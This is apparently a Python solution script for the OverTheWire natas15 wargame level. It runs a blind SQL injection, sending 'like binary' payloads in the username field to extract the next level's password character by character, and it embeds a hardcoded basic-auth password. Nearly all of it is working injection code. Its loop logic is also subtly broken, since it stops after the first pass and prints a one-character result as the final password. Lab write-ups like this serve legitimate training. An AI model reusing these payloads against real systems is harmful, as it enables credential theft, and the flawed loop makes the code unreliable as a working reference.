import string 
import requests 

alphanumeric = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
charset = ""
password = ""
target = 'http://natas15.natas.labs.overthewire.org'

# Generating the charset for the brute forcing
for char in alphanumeric:
    username = 'natas16" and password like binary "%' + char + '%'
    r = requests.get(target, 
        auth=('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'),
        params={"username": username}
        )
    if "This user exists" in r.text:
        charset += char

print("The charset used is: " + charset)

# Guessing every position in the password string 
# As the type of password is varchar(64), just to be safe the loop runs 64 times for 64 possible positions
for i in range(64):
    for char in charset:
        guess = password + char
        username = 'natas16" and password like binary "' + guess + '%'
        r = requests.get(target, 
            auth=('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'),
            params={"username": username}
            )
        if "This user exists" in r.text:
            password += char 
            print("Iteration " + str(i + 1) + ": " + guess)
            break 
    
    # No more addition of characters is possible, 
    # hence the password we have is indeed the password for this level
    print("The final password is: " + password)
    break 

